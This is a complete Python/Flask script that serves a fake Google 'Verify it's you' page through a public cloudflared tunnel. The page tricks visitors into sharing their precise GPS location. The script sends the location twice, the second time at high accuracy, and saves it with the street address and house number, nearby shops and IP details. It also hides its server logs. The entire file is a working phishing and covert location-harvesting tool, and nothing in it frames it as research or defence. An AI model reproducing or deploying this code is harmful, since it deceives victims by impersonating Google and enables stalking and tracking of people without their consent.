import os
import sys
import json
import subprocess
import re
import logging
import time
from threading import Thread
from datetime import datetime

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to install {package}: {e}", file=sys.stderr)
        sys.exit(1)

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port):
    """Starts a cloudflared tunnel and prints only the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"\nPublic Link: {match.group(0)}\n")
            sys.stdout.flush()
            break
    process.wait()

# --- Imports for Flask App (after dependency check) ---
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim
from geopy.distance import geodesic

# --- CONFIGURATION ---

LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/Locations')
os.makedirs(LOCATION_FOLDER, exist_ok=True)

logger = logging.getLogger(__name__)
logger.setLevel(logging.ERROR)  # Suppress INFO logs in terminal

# --- HELPER FUNCTIONS & BACKGROUND PROCESSING ---

geolocator = Nominatim(user_agent="fast_location_app")

def process_and_save_location(data):
    """Background process: enrich and save location data, formatted nicely."""
    try:
        lat, lon = data['latitude'], data['longitude']

        # --- Reverse Geocode ---
        full_address = "Not Available"
        address_details = {}
        try:
            location = geolocator.reverse((lat, lon), language='en', exactly_one=True, timeout=10)
            if location and hasattr(location, 'raw') and 'address' in location.raw:
                address_details = location.raw.get('address', {})
                full_address = location.address
        except Exception:
            pass

        # --- Nearby Stores (limit 2) ---
        places = get_nearby_places(lat, lon, limit=2)

        # --- IP Info ---
        ip_info = get_ip_info()

        # --- Build human-friendly JSON ---
        pretty_data = {
            "GPS Coordinates": {
                "Latitude": lat,
                "Longitude": lon,
                "Accuracy (m)": data.get("accuracy"),
                "Altitude (m)": data.get("altitude"),
                "Speed (m/s)": data.get("speed"),
                "Heading (°)": data.get("heading")
            },
            "Address": {
                "House Number": address_details.get("house_number"),
                "Street": address_details.get("road"),
                "Suburb": address_details.get("suburb"),
                "City": address_details.get("city"),
                "State": address_details.get("state"),
                "Postcode": address_details.get("postcode"),
                "Country": address_details.get("country")
            },
            "Full Address": full_address,
            "Nearby Places (Top 2)": [
                {
                    "Type": p.get("type", "Unknown").title(),
                    "Name": p.get("name", "Unnamed"),
                    "Address": p.get("address") or "N/A",
                    "Distance": f"{p['distance_m']} m" if 'distance_m' in p else "N/A"
                }
                for p in places
            ],
            "IP Location": {
                "IP": ip_info.get("ip"),
                "City": ip_info.get("city"),
                "Region": ip_info.get("region"),
                "Country": ip_info.get("country")
            }
        }

        # --- Save JSON ---
        date_str = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = os.path.join(LOCATION_FOLDER, f'location_{date_str}.json')
        with open(filename, 'w', encoding="utf-8") as f:
            json.dump(pretty_data, f, indent=4, ensure_ascii=False)

        print(f"✅ Data saved: {filename}\n")

    except Exception as e:
        logger.error(f"Error in background processing: {e}")


def get_ip_info():
    try:
        response = requests.get("http://ipinfo.io/json", timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.RequestException:
        return {}

def get_nearby_places(latitude, longitude, radius=2000, limit=2):
    """Return the closest shops/amenities with distance."""
    overpass_query = f"""
    [out:json];
    (
        node["shop"](around:{radius},{latitude},{longitude});
        way["shop"](around:{radius},{latitude},{longitude});
        node["amenity"~"restaurant|cafe|bar|fast_food|pharmacy|bank|supermarket"](around:{radius},{latitude},{longitude});
        way["amenity"~"restaurant|cafe|bar|fast_food|pharmacy|bank|supermarket"](around:{radius},{latitude},{longitude});
    );
    out center;
    """
    try:
        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query}, timeout=10)
        response.raise_for_status()
        elements = response.json().get('elements', [])
        results = []

        for element in elements:
            tags = element.get('tags', {})
            lat_elem = element.get('lat') or element.get('center', {}).get('lat')
            lon_elem = element.get('lon') or element.get('center', {}).get('lon')

            if not lat_elem or not lon_elem:
                continue

            distance = geodesic((latitude, longitude), (lat_elem, lon_elem)).meters
            results.append({
                "type": tags.get("shop") or tags.get("amenity"),
                "name": tags.get("name", "Unnamed"),
                "address": f"{tags.get('addr:street', '')} {tags.get('addr:housenumber', '')}".strip(),
                "distance_m": round(distance, 1)
            })

        results.sort(key=lambda x: x["distance_m"])
        return results[:limit]

    except requests.RequestException:
        return []

# --- FLASK APPLICATION ---

app = Flask(__name__)

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Google - Verify Location</title>
<style>
    body{margin:0;font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;background-color:#f8f9fa;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;}
    .container{background-color:white;padding:48px;border-radius:8px;border:1px solid #dadce0;max-width:450px;width:90%;box-sizing:border-box;}
    .logo-container{display:flex;justify-content:center;margin-bottom:20px;}
    .logo{width:75px;height:auto;}
    h1{font-size:24px;font-weight:400;color:#202124;margin:0 0 16px;}
    p{font-size:16px;color:#5f6368;line-height:1.5;margin-bottom:24px;}
    button{background-color:#1a73e8;color:white;border:none;border-radius:4px;padding:12px 24px;font-size:14px;font-weight:500;cursor:pointer;transition:background-color .2s,box-shadow .2s;}
    button:hover{background-color:#1b66c9;box-shadow:0 1px 3px rgba(0,0,0,0.1);}
    button:disabled{background-color:#e0e0e0;cursor:not-allowed;box-shadow:none;}
    #status{margin-top:16px;font-size:14px;height:20px;color:#5f6368;transition:color .3s ease;}
</style>
</head>
<body>
<div class="container">
    <div class="logo-container">
        <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"></path>
            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"></path>
            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"></path>
            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"></path>
        </svg>
    </div>
    <h1>Verify it's you</h1>
    <p>To help keep your account safe, Google needs to confirm your location. This helps us ensure it's really you signing in.</p>
    <button id="locationButton" onclick="requestLocation()">Share Location</button>
    <div id="status"></div>
</div>
<script>
    const statusEl = document.getElementById('status');
    const buttonEl = document.getElementById('locationButton');
    
    function sendLocationToServer(position) {
        fetch('/save_location', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                latitude: position.coords.latitude, longitude: position.coords.longitude,
                accuracy: position.coords.accuracy, altitude: position.coords.altitude,
                speed: position.coords.speed, heading: position.coords.heading
            })
        });
    }

    function requestLocation() {
        buttonEl.disabled = true;
        statusEl.style.color = '#5f6368';
        statusEl.textContent = 'Requesting permission...';

        if (!navigator.geolocation) {
            statusEl.style.color = '#d93025';
            statusEl.textContent = 'Geolocation is not supported by your browser.';
            buttonEl.disabled = false;
            return;
        }

        // Step 1: Get a fast, low-accuracy position first.
        navigator.geolocation.getCurrentPosition(
            (fastPosition) => {
                statusEl.style.color = '#1e8e3e';
                statusEl.textContent = 'Location received. Finalizing verification...';
                sendLocationToServer(fastPosition);

                // Step 2: Now try to get a more accurate position.
                navigator.geolocation.getCurrentPosition(
                    (accuratePosition) => {
                        statusEl.textContent = 'Verification complete. Thank you!';
                        sendLocationToServer(accuratePosition);
                    },
                    () => {
                        // This block runs if the high-accuracy attempt fails.
                        // The initial location was already saved, which is good enough.
                        statusEl.textContent = 'Initial verification complete. Thank you!';
                    },
                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                );
            },
            (err) => {
                statusEl.style.color = '#d93025';
                statusEl.textContent = `Error: ${err.message}. Please enable location services.`;
                buttonEl.disabled = false;
            },
            // Options for the first, faster call
            { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
        );
    }
</script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save_location', methods=['POST'])
def save_location():
    data = request.get_json(force=True)
    if not data or 'latitude' not in data:
        return jsonify({"error": "Invalid location data."}), 400

    processing_thread = Thread(target=process_and_save_location, args=(data,))
    processing_thread.daemon = True
    processing_thread.start()
    return jsonify({"message": "Location data received."}), 202

# --- MAIN EXECUTION ---

if __name__ == '__main__':
    check_dependencies()
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4040
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port)
    except KeyboardInterrupt:
        print("\nShutting down...")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn error occurred: {e}")
        sys.exit(1)